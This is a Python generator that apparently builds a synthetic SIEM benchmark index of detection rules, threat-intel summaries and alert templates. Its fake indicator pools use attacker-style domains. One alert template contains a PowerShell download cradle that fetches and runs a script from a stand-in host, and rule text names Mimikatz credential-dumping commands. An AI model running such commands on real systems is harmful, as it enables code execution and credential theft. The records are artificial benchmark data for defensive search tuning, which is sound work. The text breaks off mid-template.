#!/usr/bin/env python3
"""
ElastiProbe Security SIEM Benchmark Dataset Generator

Generates ~300 realistic security documents for Elastic SIEM search relevance tuning.
Document types: detection rules, security alerts, threat intel reports,
incident summaries, and vulnerability advisories.
"""

import json
import random
import hashlib
import datetime
import requests

ES_URL = "http://localhost:9200"
INDEX_NAME = "security-siem"

# ---------------------------------------------------------------------------
# Reference data
# ---------------------------------------------------------------------------

MITRE_MAP = {
    "initial_access": [
        "Phishing", "Exploit Public-Facing Application", "Supply Chain Compromise",
        "Drive-by Compromise", "Valid Accounts", "Trusted Relationship",
        "External Remote Services",
    ],
    "execution": [
        "PowerShell", "Windows Management Instrumentation", "Command and Scripting Interpreter",
        "Scheduled Task/Job", "User Execution", "Native API",
        "Inter-Process Communication", "Shared Modules",
    ],
    "persistence": [
        "Registry Run Keys", "Scheduled Task/Job", "Create Account",
        "Boot or Logon Autostart Execution", "Server Software Component",
        "Implant Internal Image", "Account Manipulation",
    ],
    "privilege_escalation": [
        "Exploitation for Privilege Escalation", "Process Injection",
        "Access Token Manipulation", "Sudo and Sudo Caching",
        "Valid Accounts", "Domain Policy Modification",
    ],
    "defense_evasion": [
        "Obfuscated Files or Information", "Masquerading", "Rootkit",
        "Indicator Removal", "Process Injection", "Signed Binary Proxy Execution",
        "Virtualization/Sandbox Evasion", "Impair Defenses",
    ],
    "credential_access": [
        "OS Credential Dumping", "Brute Force", "Input Capture",
        "Credentials from Password Stores", "Steal Web Session Cookie",
        "Kerberoasting", "Unsecured Credentials",
    ],
    "discovery": [
        "Network Service Discovery", "System Information Discovery",
        "Account Discovery", "Permission Groups Discovery",
        "Remote System Discovery", "Software Discovery",
    ],
    "lateral_movement": [
        "Remote Services", "Lateral Tool Transfer", "Remote Desktop Protocol",
        "SMB/Windows Admin Shares", "SSH", "Internal Spearphishing",
    ],
    "collection": [
        "Data from Local System", "Screen Capture", "Email Collection",
        "Clipboard Data", "Archive Collected Data", "Data from Network Shared Drive",
    ],
    "exfiltration": [
        "Exfiltration Over C2 Channel", "Exfiltration Over Alternative Protocol",
        "Exfiltration Over Web Service", "Automated Exfiltration",
        "Data Transfer Size Limits", "Exfiltration Over DNS",
    ],
    "command_and_control": [
        "Application Layer Protocol", "Encrypted Channel",
        "Proxy", "Remote Access Software", "Data Encoding",
        "Dynamic Resolution", "Non-Standard Port", "Protocol Tunneling",
    ],
}

CATEGORIES = ["malware", "phishing", "network", "endpoint", "identity", "cloud"]
SEVERITIES = ["critical", "high", "medium", "low"]
SEVERITY_WEIGHTS = [0.15, 0.30, 0.35, 0.20]
SOURCES = ["detection_rule", "alert", "threat_intel", "incident", "vulnerability"]

IOC_POOLS = {
    "ip": [
        "185.220.101.34", "91.219.236.174", "45.33.32.156", "198.51.100.23",
        "203.0.113.42", "172.16.254.1", "10.0.0.200", "192.168.1.105",
        "94.232.46.18", "78.128.113.66", "162.247.74.7", "23.129.64.100",
        "104.244.76.13", "199.249.230.87", "176.10.99.200",
    ],
    "domain": [
        "evil-payload.xyz", "c2-beacon.ru", "data-exfil.cc", "phish-login.com",
        "update-service.info", "cdn-analytics.net", "secure-auth-verify.com",
        "cloud-sync-service.org", "microsoft-update-check.com", "api-gateway-auth.io",
        "trusted-relay.net", "internal-vpn-gateway.com",
    ],
    "hash": [],  # generated dynamically
    "email": [
        "attacker@evil-payload.xyz", "admin@phish-login.com", "support@secure-auth-verify.com",
        "hr@company-benefits.info", "it-helpdesk@update-service.info",
        "ceo@trusted-relay.net",
    ],
    "url": [
        "https://evil-payload.xyz/stage2.ps1", "http://c2-beacon.ru/gate.php",
        "https://phish-login.com/office365/login.html",
        "http://data-exfil.cc/upload?id=", "https://cdn-analytics.net/pixel.js",
    ],
    "file_path": [
        "C:\\Windows\\Temp\\svchost.exe", "/tmp/.hidden/beacon", "C:\\Users\\Public\\update.bat",
        "/var/tmp/cron_backdoor.sh", "C:\\ProgramData\\Microsoft\\Crypto\\keylogger.dll",
    ],
}

# Generate random MD5/SHA256 hashes for IOC pool
for _ in range(20):
    seed = f"hash-seed-{random.randint(0, 999999)}"
    IOC_POOLS["hash"].append(hashlib.sha256(seed.encode()).hexdigest())

TAG_POOL = [
    "ransomware", "apt", "zero-day", "credential-theft", "webshell",
    "backdoor", "trojan", "worm", "botnet", "cryptominer",
    "living-off-the-land", "fileless", "supply-chain", "insider-threat",
    "cloud-misconfiguration", "container-escape", "dns-tunneling",
    "cobalt-strike", "mimikatz", "impacket", "bloodhound",
    "kerberoasting", "golden-ticket", "pass-the-hash", "dcsync",
    "log4shell", "proxyshell", "eternalblue", "printnightmare",
    "follina", "spring4shell", "cve-exploit", "watering-hole",
    "spearphishing", "business-email-compromise", "typosquatting",
    "dll-sideloading", "process-hollowing", "reflective-loading",
]

THREAT_ACTORS = [
    "APT28 (Fancy Bear)", "APT29 (Cozy Bear)", "Lazarus Group",
    "FIN7", "Carbanak", "Wizard Spider", "Sandworm", "Turla",
    "MuddyWater", "OceanLotus (APT32)", "Chimera", "Hafnium",
    "Nobelium", "DarkSide", "REvil", "LockBit", "Conti",
    "BlackCat (ALPHV)", "Cl0p", "Vice Society",
]

CVE_IDS = [
    "CVE-2024-3400", "CVE-2024-21762", "CVE-2024-1709", "CVE-2023-46805",
    "CVE-2023-34362", "CVE-2023-27997", "CVE-2023-22515", "CVE-2023-4966",
    "CVE-2022-26134", "CVE-2022-41040", "CVE-2021-44228", "CVE-2021-34527",
    "CVE-2021-27065", "CVE-2021-21972", "CVE-2020-1472", "CVE-2019-19781",
    "CVE-2024-38063", "CVE-2024-28986", "CVE-2024-6387", "CVE-2023-20198",
]

PLATFORMS = ["Windows", "Linux", "macOS", "AWS", "Azure", "GCP", "Kubernetes", "Docker"]

# ---------------------------------------------------------------------------
# Document generators
# ---------------------------------------------------------------------------

def _pick_mitre():
    tactic = random.choice(list(MITRE_MAP.keys()))
    technique = random.choice(MITRE_MAP[tactic])
    return tactic, technique

def _pick_iocs(n=None):
    if n is None:
        n = random.randint(1, 4)
    types = random.sample(list(IOC_POOLS.keys()), min(n, len(IOC_POOLS)))
    return types

def _pick_tags(n=None):
    if n is None:
        n = random.randint(2, 6)
    return random.sample(TAG_POOL, min(n, len(TAG_POOL)))

def _ts(days_back_max=90):
    d = datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(
        days=random.randint(0, days_back_max),
        hours=random.randint(0, 23),
        minutes=random.randint(0, 59),
    )
    return d.isoformat()

# ------ Detection Rules ------

DETECTION_RULES = [
    {
        "title": "PowerShell Base64 Encoded Command Execution",
        "description": "Detects execution of PowerShell with base64-encoded commands, commonly used by threat actors to obfuscate malicious payloads. The rule triggers when powershell.exe or pwsh.exe is launched with -EncodedCommand, -enc, or -e flags followed by a base64 string. This technique is prevalent in fileless malware campaigns, Cobalt Strike beacon deployment, and living-off-the-land attacks.",
        "severity": "high",
        "category": "endpoint",
        "mitre_tactic": "execution",
        "mitre_technique": "PowerShell",
        "tags": ["powershell", "fileless", "living-off-the-land", "cobalt-strike", "encoded-command"],
        "ioc_types": ["file_path", "hash"],
        "platform": "Windows",
    },
    {
        "title": "Suspicious DNS TXT Record Queries for Data Exfiltration",
        "description": "Identifies high-frequency DNS TXT record queries that may indicate DNS tunneling or data exfiltration. Adversaries encode stolen data in DNS queries to bypass network security controls. The rule monitors for unusual patterns in DNS query volume, query length exceeding normal thresholds (>50 chars in subdomain), and queries to recently registered domains. Common tools: dnscat2, iodine, DNSExfiltrator.",
        "severity": "high",
        "category": "network",
        "mitre_tactic": "exfiltration",
        "mitre_technique": "Exfiltration Over DNS",
        "tags": ["dns-tunneling", "exfiltration", "data-theft", "covert-channel"],
        "ioc_types": ["domain", "ip"],
        "platform": "Linux",
    },
    {
        "title": "Brute Force Authentication Attempts Against Active Directory",
        "description": "Detects multiple failed authentication attempts against Active Directory domain controllers within a short time window. Triggers when more than 15 failed logon events (Event ID 4625) originate from the same source IP within 5 minutes. Covers password spraying, credential stuffing, and traditional brute force attacks against Kerberos and NTLM authentication.",
        "severity": "medium",
        "category": "identity",
        "mitre_tactic": "credential_access",
        "mitre_technique": "Brute Force",
        "tags": ["brute-force", "credential-theft", "active-directory", "password-spray"],
        "ioc_types": ["ip"],
        "platform": "Windows",
    },
    {
        "title": "LSASS Memory Credential Dumping via Mimikatz",
        "description": "Detects attempts to dump credentials from the Local Security Authority Subsystem Service (LSASS) process memory. Monitors for known Mimikatz command patterns (sekurlsa::logonpasswords, lsadump::dcsync), suspicious LSASS access with PROCESS_VM_READ permissions, and creation of lsass.dmp files. This technique enables pass-the-hash, pass-the-ticket, and golden ticket attacks.",
        "severity": "critical",
        "category": "endpoint",
        "mitre_tactic": "credential_access",
        "mitre_technique": "OS Credential Dumping",
        "tags": ["mimikatz", "credential-theft", "lsass", "pass-the-hash", "dcsync"],
        "ioc_types": ["file_path", "hash"],
        "platform": "Windows",
    },
    {
        "title": "Lateral Movement via Windows Admin Shares (C$ and ADMIN$)",
        "description": "Detects remote access to administrative shares (C$, ADMIN$, IPC$) from internal hosts, which may indicate lateral movement. Correlates SMB connection events with authentication logs to identify compromised accounts being used to pivot across the network. Excludes known IT admin workstations and service accounts to reduce false positives.",
        "severity": "high",
        "category": "network",
        "mitre_tactic": "lateral_movement",
        "mitre_technique": "SMB/Windows Admin Shares",
        "tags": ["lateral-movement", "smb", "admin-shares", "network-pivoting"],
        "ioc_types": ["ip"],
        "platform": "Windows",
    },
    {
        "title": "Ransomware File Encryption Behavior Pattern",
        "description": "Detects rapid file modification patterns consistent with ransomware encryption. Triggers when a single process modifies more than 100 files within 60 seconds, changes file extensions to known ransomware patterns (.encrypted, .locked, .crypt), or drops ransom note files (README.txt, DECRYPT_FILES.html). Covers LockBit, BlackCat/ALPHV, Cl0p, and other major ransomware families.",
        "severity": "critical",
        "category": "endpoint",
        "mitre_tactic": "execution",
        "mitre_technique": "Command and Scripting Interpreter",
        "tags": ["ransomware", "encryption", "lockbit", "file-modification"],
        "ioc_types": ["file_path", "hash"],
        "platform": "Windows",
    },
    {
        "title": "Kerberoasting Service Ticket Request Anomaly",
        "description": "Detects potential Kerberoasting attacks by monitoring for anomalous TGS-REQ requests targeting service accounts with SPNs. Identifies when a single user requests service tickets for multiple service accounts within a short window, particularly for accounts with weak encryption types (RC4). Attackers use tools like Rubeus and Invoke-Kerberoast to extract service tickets for offline cracking.",
        "severity": "high",
        "category": "identity",
        "mitre_tactic": "credential_access",
        "mitre_technique": "Kerberoasting",
        "tags": ["kerberoasting", "active-directory", "credential-theft", "service-ticket"],
        "ioc_types": ["ip"],
        "platform": "Windows",
    },
    {
        "title": "AWS IAM Policy Modification by Unauthorized Principal",
        "description": "Detects modifications to AWS IAM policies by principals not in the approved administrator list. Monitors CloudTrail for PutUserPolicy, PutGroupPolicy, PutRolePolicy, AttachUserPolicy, AttachGroupPolicy, and AttachRolePolicy API calls from unexpected source IPs or IAM users/roles. Privilege escalation in cloud environments often starts with IAM policy manipulation.",
        "severity": "critical",
        "category": "cloud",
        "mitre_tactic": "privilege_escalation",
        "mitre_technique": "Domain Policy Modification",
        "tags": ["cloud-misconfiguration", "aws", "iam", "privilege-escalation"],
        "ioc_types": ["ip"],
        "platform": "AWS",
    },
    {
        "title": "Webshell Detection via Anomalous Web Server Child Process",
        "description": "Detects webshell activity by monitoring for suspicious child processes spawned by web server processes (w3wp.exe, httpd, nginx, apache2). Webshells allow adversaries to execute arbitrary commands through a web-accessible backdoor. Triggers on cmd.exe, powershell.exe, bash, python, certutil, or whoami being spawned by a web server process.",
        "severity": "critical",
        "category": "endpoint",
        "mitre_tactic": "persistence",
        "mitre_technique": "Server Software Component",
        "tags": ["webshell", "backdoor", "web-server", "remote-code-execution"],
        "ioc_types": ["file_path", "hash", "ip"],
        "platform": "Linux",
    },
    {
        "title": "Phishing Email with Macro-Enabled Office Attachment",
        "description": "Detects inbound emails containing macro-enabled Office documents (.docm, .xlsm, .pptm) or documents with embedded VBA macros. Correlates with sender reputation, SPF/DKIM failures, and newly registered sender domains. Macro-enabled documents remain the most common initial access vector for malware delivery including Emotet, QakBot, and IcedID.",
        "severity": "high",
        "category": "phishing",
        "mitre_tactic": "initial_access",
        "mitre_technique": "Phishing",
        "tags": ["phishing", "spearphishing", "macro", "email", "social-engineering"],
        "ioc_types": ["email", "hash", "domain"],
        "platform": "Windows",
    },
    {
        "title": "Process Injection via CreateRemoteThread",
        "description": "Detects process injection using the CreateRemoteThread Windows API. Monitors for processes calling OpenProcess with PROCESS_ALL_ACCESS followed by VirtualAllocEx and CreateRemoteThread on a target process. This technique is used by RATs, banking trojans, and advanced implants to inject malicious code into legitimate processes for defense evasion.",
        "severity": "high",
        "category": "endpoint",
        "mitre_tactic": "defense_evasion",
        "mitre_technique": "Process Injection",
        "tags": ["process-injection", "defense-evasion", "reflective-loading", "dll-injection"],
        "ioc_types": ["hash", "file_path"],
        "platform": "Windows",
    },
    {
        "title": "Container Escape Attempt via Privileged Operation",
        "description": "Detects attempts to escape container isolation through privileged operations such as mounting the host filesystem, accessing /proc/self/root, nsenter usage, or exploitation of vulnerable container runtimes. Monitors for syscalls and process execution patterns indicative of container breakout in Docker and Kubernetes environments.",
        "severity": "critical",
        "category": "cloud",
        "mitre_tactic": "privilege_escalation",
        "mitre_technique": "Exploitation for Privilege Escalation",
        "tags": ["container-escape", "kubernetes", "docker", "privilege-escalation"],
        "ioc_types": ["file_path"],
        "platform": "Kubernetes",
    },
    {
        "title": "Scheduled Task Created for Persistence",
        "description": "Detects creation of scheduled tasks via schtasks.exe, at.exe, or the Task Scheduler COM interface that may indicate persistence mechanisms. Filters for tasks running at boot/logon, tasks pointing to unusual binary locations (Temp, AppData, Public), and tasks created by non-administrative users. Common persistence technique for Cobalt Strike, TrickBot, and Emotet.",
        "severity": "medium",
        "category": "endpoint",
        "mitre_tactic": "persistence",
        "mitre_technique": "Scheduled Task/Job",
        "tags": ["persistence", "scheduled-task", "autostart"],
        "ioc_types": ["file_path"],
        "platform": "Windows",
    },
    {
        "title": "Suspicious Outbound Connection to Tor Exit Node",
        "description": "Detects outbound network connections to known Tor exit node IP addresses. While Tor has legitimate uses, connections from corporate endpoints to Tor often indicate data exfiltration, C2 communication, or policy violations. The rule maintains an updated list of Tor exit nodes from the Tor Project directory authorities.",
        "severity": "medium",
        "category": "network",
        "mitre_tactic": "command_and_control",
        "mitre_technique": "Proxy",
        "tags": ["tor", "anonymization", "covert-channel", "command-and-control"],
        "ioc_types": ["ip"],
        "platform": "Linux",
    },
    {
        "title": "DLL Side-Loading via Renamed System Binary",
        "description": "Detects DLL side-loading attacks where a legitimate signed Windows binary is copied to a writable directory alongside a malicious DLL. The rule monitors for known vulnerable executables (e.g., consent.exe, msdtc.exe, searchprotocolhost.exe) executing from non-standard paths while loading unsigned DLLs. This technique bypasses application whitelisting and code signing controls.",
        "severity": "high",
        "category": "endpoint",
        "mitre_tactic": "defense_evasion",
        "mitre_technique": "Signed Binary Proxy Execution",
        "tags": ["dll-sideloading", "defense-evasion", "signed-binary", "living-off-the-land"],
        "ioc_types": ["file_path", "hash"],
        "platform": "Windows",
    },
    {
        "title": "Azure AD Impossible Travel Detection",
        "description": "Detects Azure AD sign-in events from geographically distant locations within a timeframe that makes physical travel impossible. Correlates authentication logs from Azure AD with GeoIP data to identify potential account compromise. Excludes VPN endpoints and known cloud service IPs to minimize false positives.",
        "severity": "medium",
        "category": "identity",
        "mitre_tactic": "initial_access",
        "mitre_technique": "Valid Accounts",
        "tags": ["impossible-travel", "account-compromise", "azure-ad", "cloud"],
        "ioc_types": ["ip"],
        "platform": "Azure",
    },
    {
        "title": "Supply Chain Attack via Compromised Software Update",
        "description": "Detects indicators of supply chain compromise through software update mechanisms. Monitors for digitally signed binaries making unexpected network connections during update processes, hash mismatches in update packages, and known-compromised update server domains. Inspired by SolarWinds SUNBURST, 3CX, and MOVEit supply chain incidents.",
        "severity": "critical",
        "category": "endpoint",
        "mitre_tactic": "initial_access",
        "mitre_technique": "Supply Chain Compromise",
        "tags": ["supply-chain", "software-update", "trojanized-binary", "apt"],
        "ioc_types": ["domain", "hash", "ip"],
        "platform": "Windows",
    },
    {
        "title": "Data Staging in Archive Files Before Exfiltration",
        "description": "Detects creation of archive files (7z, zip, rar, tar.gz) in staging directories followed by large outbound data transfers. Adversaries commonly compress and stage collected data before exfiltrating it. Monitors for archive creation tools running in unusual contexts, archives exceeding size thresholds, and subsequent network transfer events.",
        "severity": "high",
        "category": "endpoint",
        "mitre_tactic": "collection",
        "mitre_technique": "Archive Collected Data",
        "tags": ["data-staging", "exfiltration", "archive", "data-theft"],
        "ioc_types": ["file_path"],
        "platform": "Windows",
    },
    {
        "title": "Linux Kernel Exploit for Privilege Escalation",
        "description": "Detects exploitation of Linux kernel vulnerabilities for local privilege escalation. Monitors for known exploit signatures including DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195), and Netfilter (CVE-2023-32233) exploitation patterns. Triggers on unexpected SUID binary creation, kernel module loading by non-root users, and /proc/sys modifications.",
        "severity": "critical",
        "category": "endpoint",
        "mitre_tactic": "privilege_escalation",
        "mitre_technique": "Exploitation for Privilege Escalation",
        "tags": ["kernel-exploit", "privilege-escalation", "linux", "cve-exploit"],
        "ioc_types": ["file_path"],
        "platform": "Linux",
    },
    {
        "title": "Business Email Compromise Wire Transfer Request",
        "description": "Detects potential business email compromise (BEC) emails requesting urgent wire transfers or payment changes. Uses NLP-based content analysis to identify social engineering language patterns, impersonation of executives, and urgency indicators. Correlates with sender authentication (SPF/DKIM/DMARC), display name spoofing, and reply-to address manipulation.",
        "severity": "high",
        "category": "phishing",
        "mitre_tactic": "initial_access",
        "mitre_technique": "Phishing",
        "tags": ["business-email-compromise", "wire-fraud", "social-engineering", "spearphishing"],
        "ioc_types": ["email", "domain"],
        "platform": "Windows",
    },
    {
        "title": "GCP Service Account Key Exfiltration",
        "description": "Detects unauthorized export or creation of GCP service account keys. Monitors Cloud Audit Logs for google.iam.admin.v1.CreateServiceAccountKey events from unusual source IPs or user agents. Service account key theft is a primary vector for persistent access to Google Cloud resources and lateral movement between GCP projects.",
        "severity": "high",
        "category": "cloud",
        "mitre_tactic": "credential_access",
        "mitre_technique": "Unsecured Credentials",
        "tags": ["gcp", "cloud", "service-account", "credential-theft", "key-exfiltration"],
        "ioc_types": ["ip"],
        "platform": "GCP",
    },
    {
        "title": "Cobalt Strike Beacon Malleable C2 Traffic",
        "description": "Detects Cobalt Strike beacon command-and-control communication using malleable C2 profiles. Analyzes HTTP/HTTPS traffic patterns including cookie-based data encoding, specific URI patterns (/api/v1/check, /updates/check), JA3/JA3S TLS fingerprints, and timing-based beaconing intervals. Cobalt Strike remains the most prevalent post-exploitation framework used by both red teams and APT groups.",
        "severity": "critical",
        "category": "network",
        "mitre_tactic": "command_and_control",
        "mitre_technique": "Application Layer Protocol",
        "tags": ["cobalt-strike", "beacon", "c2", "command-and-control", "malleable-profile"],
        "ioc_types": ["ip", "domain", "url"],
        "platform": "Windows",
    },
    {
        "title": "Registry Persistence via Run Key Modification",
        "description": "Detects modification of Windows Registry Run and RunOnce keys for persistence. Monitors HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run, HKCU equivalent, and RunOnce keys. Filters for additions pointing to unsigned binaries, temporary directories, or encoded PowerShell commands. Common persistence mechanism for RATs, banking trojans, and backdoors.",
        "severity": "medium",
        "category": "endpoint",
        "mitre_tactic": "persistence",
        "mitre_technique": "Registry Run Keys",
        "tags": ["registry", "persistence", "autostart", "run-key"],
        "ioc_types": ["file_path", "hash"],
        "platform": "Windows",
    },
    {
        "title": "Network Discovery via Internal Port Scanning",
        "description": "Detects internal network reconnaissance through port scanning activity. Triggers when a single source IP attempts connections to more than 50 unique destination IP:port combinations within 10 minutes on the internal network. Distinguishes between horizontal scans (one port, many hosts) and vertical scans (many ports, one host). Common precursor to lateral movement.",
        "severity": "medium",
        "category": "network",
        "mitre_tactic": "discovery",
        "mitre_technique": "Network Service Discovery",
        "tags": ["port-scan", "reconnaissance", "network-discovery", "internal"],
        "ioc_types": ["ip"],
        "platform": "Linux",
    },
    {
        "title": "Cryptomining Activity Detected on Endpoint",
        "description": "Detects cryptocurrency mining activity on corporate endpoints. Monitors for known mining pool connections (stratum+tcp://), mining binary hashes, excessive CPU usage patterns consistent with proof-of-work computation, and command-line arguments common to XMRig, PhoenixMiner, and other mining software. Cryptojacking is increasingly deployed alongside other malware payloads.",
        "severity": "medium",
        "category": "endpoint",
        "mitre_tactic": "execution",
        "mitre_technique": "Command and Scripting Interpreter",
        "tags": ["cryptominer", "cryptojacking", "xmrig", "resource-abuse"],
        "ioc_types": ["ip", "domain", "hash"],
        "platform": "Linux",
    },
]

# ------ Threat Intelligence Reports ------

THREAT_INTEL_REPORTS = [
    {
        "title": "APT29 Targets Government Agencies with Novel WINELOADER Backdoor",
        "description": "Threat intelligence report on APT29 (Cozy Bear) campaign targeting European government agencies and diplomatic entities with a previously undocumented backdoor dubbed WINELOADER. The campaign leverages spearphishing emails impersonating wine-tasting event invitations with malicious .hta attachments. WINELOADER uses DLL side-loading through a legitimate wine application to establish persistence, implements encrypted C2 over HTTPS with certificate pinning, and employs anti-analysis techniques including virtual machine detection and sandbox evasion. The backdoor supports modular plugin architecture for keylogging, screen capture, and credential harvesting. Associated infrastructure uses bulletproof hosting providers across Eastern Europe.",
        "severity": "critical",
        "category": "malware",
        "mitre_tactic": "initial_access",
        "mitre_technique": "Phishing",
        "tags": ["apt", "apt29", "cozy-bear", "backdoor", "government", "spearphishing"],
        "ioc_types": ["domain", "ip", "hash", "email"],
        "threat_actor": "APT29 (Cozy Bear)",
        "platform": "Windows",
    },
    {
        "title": "LockBit 3.0 Ransomware Technical Analysis and TTPs",
        "description": "Comprehensive technical analysis of the LockBit 3.0 (LockBit Black) ransomware variant including detailed breakdown of encryption algorithm, anti-debugging features, and affiliate deployment playbook. LockBit 3.0 introduces a bug bounty program, improved encryption speed using AES-256 in CTR mode with RSA-2048 for key exchange, and enhanced evasion via NTDLL unhooking. Initial access typically occurs through exposed RDP, exploited VPN appliances, or phishing. Affiliates use Cobalt Strike, Mimikatz, and BloodHound for network reconnaissance before deployment. The malware disables Windows Defender, clears event logs, and deletes volume shadow copies before encrypting files.",
        "severity": "critical",
        "category": "malware",
        "mitre_tactic": "execution",
        "mitre_technique": "Command and Scripting Interpreter",
        "tags": ["ransomware", "lockbit", "encryption", "affiliate", "double-extortion"],
        "ioc_types": ["hash", "domain", "ip"],
        "threat_actor": "LockBit",
        "platform": "Windows",
    },
    {
        "title": "Lazarus Group Cryptocurrency Exchange Targeting Campaign",
        "description": "Intelligence report on Lazarus Group operations targeting cryptocurrency exchanges and DeFi platforms. The campaign employs trojanized trading applications distributed through targeted LinkedIn social engineering. Once installed, the malware establishes persistence via Launch Agents on macOS and scheduled tasks on Windows, then monitors for cryptocurrency wallet activity. The custom RAT supports real-time clipboard hijacking to replace cryptocurrency addresses, keylogging for exchange credentials, and browser session hijacking. Attribution is based on overlapping infrastructure with previous Lazarus campaigns and shared code signatures.",
        "severity": "critical",
        "category": "malware",
        "mitre_tactic": "initial_access",
        "mitre_technique": "Trusted Relationship",
        "tags": ["apt", "lazarus", "cryptocurrency", "supply-chain", "trojan", "social-engineering"],
        "ioc_types": ["domain", "ip", "hash"],
        "threat_actor": "Lazarus Group",
        "platform": "macOS",
    },
    {
        "title": "FIN7 Evolves with New POWERTRASH Loader and Black Basta Partnership",
        "description": "Updated threat intelligence on FIN7 operations revealing adoption of a new in-memory .NET loader named POWERTRASH for deploying Carbanak and Lizar backdoors. FIN7 has established operational partnerships with Black Basta ransomware operators, providing initial access through phishing campaigns targeting financial institutions. The group has diversified from point-of-sale malware to ransomware deployment, data extortion, and intellectual property theft. New TTPs include abuse of legitimate cloud services for C2, advanced phishing lures exploiting current events, and deployment of custom EDR-bypassing tools.",
        "severity": "high",
        "category": "malware",
        "mitre_tactic": "execution",
        "mitre_technique": "PowerShell",
        "tags": ["fin7", "carbanak", "ransomware", "financial", "loader", "apt"],
        "ioc_types": ["domain", "hash", "ip", "email"],
        "threat_actor": "FIN7",
        "platform": "Windows",
    },
    {
        "title": "Sandworm Targets Critical Infrastructure with INDUSTROYER2",
        "description": "Detailed analysis of Sandworm (Unit 74455) operations deploying INDUSTROYER2 against critical infrastructure in Eastern Europe. The malware specifically targets ICS/SCADA systems in energy sector organizations, capable of manipulating IEC-104, IEC-61850, and OPC DA protocols. The attack chain begins with compromised VPN credentials, followed by Active Directory compromise using DCSync and golden ticket attacks for persistent access. Wiper malware (CaddyWiper) is deployed alongside INDUSTROYER2 to destroy forensic evidence and hamper recovery efforts.",
        "severity": "critical",
        "category": "malware",
        "mitre_tactic": "lateral_movement",
        "mitre_technique": "Remote Services",
        "tags": ["apt", "sandworm", "ics", "scada", "critical-infrastructure", "wiper"],
        "ioc_types": ["ip", "hash", "domain"],
        "threat_actor": "Sandworm",
        "platform": "Windows",
    },
    {
        "title": "MuddyWater Deploys PhonyC2 Framework in Middle East Campaign",
        "description": "Threat report on MuddyWater (MERCURY, Static Kitten) deploying a custom C2 framework dubbed PhonyC2 against telecom and government targets in the Middle East. Initial access is achieved through exploitation of Exchange servers (ProxyShell) and Fortinet vulnerabilities. PhonyC2 is a Python-based framework that generates PowerShell implants with polymorphic obfuscation, supports multiple communication protocols (HTTP/DNS/ICMP), and includes modules for credential harvesting, file exfiltration, and lateral movement via WMI.",
        "severity": "high",
        "category": "malware",
        "mitre_tactic": "command_and_control",
        "mitre_technique": "Application Layer Protocol",
        "tags": ["muddywater", "apt", "c2-framework", "middle-east", "government", "telecom"],
        "ioc_types": ["ip", "domain", "hash"],
        "threat_actor": "MuddyWater",
        "platform": "Windows",
    },
    {
        "title": "Cl0p Ransomware Mass Exploitation of MOVEit Transfer Vulnerability",
        "description": "Emergency intelligence bulletin on Cl0p ransomware group's mass exploitation of CVE-2023-34362 (MOVEit Transfer SQL injection). Over 2,500 organizations globally affected. The attack chain exploits the SQL injection to deploy a webshell (LEMURLOOT) that enables data theft before encryption. Cl0p operators have shifted from traditional ransomware encryption to pure data theft and extortion, threatening publication on their leak site. Organizations using MOVEit Transfer should immediately patch and audit transfer logs for suspicious activity.",
        "severity": "critical",
        "category": "malware",
        "mitre_tactic": "initial_access",
        "mitre_technique": "Exploit Public-Facing Application",
        "tags": ["cl0p", "ransomware", "moveit", "cve-exploit", "data-theft", "mass-exploitation"],
        "ioc_types": ["ip", "domain", "hash", "url"],
        "threat_actor": "Cl0p",
        "platform": "Windows",
    },
    {
        "title": "Emerging Threat: AI-Generated Phishing Campaigns with Deepfake Voice",
        "description": "Threat intelligence assessment on the growing trend of AI-generated phishing attacks incorporating deepfake voice technology. Threat actors are using large language models to craft highly convincing spearphishing emails that bypass traditional detection, and deepfake voice synthesis for vishing (voice phishing) attacks impersonating executives. Recent incidents include a $25 million wire fraud using deepfake video conferencing and multiple CEO impersonation vishing attacks targeting finance departments. Traditional phishing detection models show 40% lower detection rates against AI-generated content.",
        "severity": "high",
        "category": "phishing",
        "mitre_tactic": "initial_access",
        "mitre_technique": "Phishing",
        "tags": ["phishing", "deepfake", "ai-generated", "vishing", "social-engineering", "business-email-compromise"],
        "ioc_types": ["email", "domain"],
        "threat_actor": None,
        "platform": "Windows",
    },
]

# ------ Security Alerts (templates to be expanded with variation) ------

ALERT_TEMPLATES = [
    {
        "title": "Malware Detected: Emotet Dropper on Workstation {host}",
        "description": "Endpoint detection alert: Emotet banking trojan dropper identified on workstation {host}. The malware was delivered via a phishing email with a macro-enabled Excel document. The dropper contacted C2 server {c2_ip} on port 8080 and attempted to download additional payloads including TrickBot and Cobalt Strike beacons. The malicious process was spawned from WINWORD.EXE -> cmd.exe -> powershell.exe chain. Hash: {hash}. Process was quarantined by endpoint protection.",
        "severity": "high",
        "category": "malware",
        "mitre_tactic": "execution",
        "mitre_technique": "User Execution",
        "tags": ["emotet", "trojan", "dropper", "macro", "phishing"],
        "ioc_types": ["hash", "ip", "email", "file_path"],
    },
    {
        "title": "Credential Phishing Page Accessed by User {user}",
        "description": "Security alert: User {user} accessed a credential phishing page hosted at {phish_domain} that impersonates the corporate Microsoft 365 login portal. The page was served over HTTPS with a valid Let's Encrypt certificate. DNS analysis shows the domain was registered 2 days ago. The user's browser submitted form data to the page. Immediate password reset required. The phishing kit matches known attributes of the 'EvilProxy' phishing-as-a-service platform that can bypass MFA.",
        "severity": "critical",
        "category": "phishing",
        "mitre_tactic": "credential_access",
        "mitre_technique": "Input Capture",
        "tags": ["phishing", "credential-theft", "evilproxy", "mfa-bypass"],
        "ioc_types": ["domain", "url", "email"],
    },
    {
        "title": "Suspicious PowerShell Download Cradle Executed on {host}",
        "description": "Alert triggered by detection of a PowerShell download cradle execution on {host}. Command: IEX(New-Object Net.WebClient).DownloadString('{payload_url}'). The script was executed with -WindowStyle Hidden and -ExecutionPolicy Bypass flags. The downloaded payload is a Cobalt Strike stager that establishes an HTTPS beacon to {c2_ip}. Parent process was explorer.exe, suggesting user execution via a malicious shortcut file (.lnk).",
        "severity": "high",
        "category": "endpoint",
        "mitre_tactic": "execution",
        "mitre_technique": "PowerShell",
        "tags": ["powershell", "download-cradle", "cobalt-strike", "fileless"],
        "ioc_types": ["ip", "url", "hash"],
    },
    {
        "title": "Data Exfiltration Alert: Large Upload to Cloud Storage from {host}",
        "description": "DLP alert: Anomalous data upload detected from {host} to external cloud storage service {cloud_service}. Transfer volume of 4.7 GB over 45 minutes significantly exceeds the user's baseline of 200 MB/day. The uploaded files include documents matching data classification patterns for PII, financial records, and source code repositories. The upload occurred outside business hours (02:47 AM local time) from a VPN connection originating from an unusual geographic location.",
        "severity": "critical",
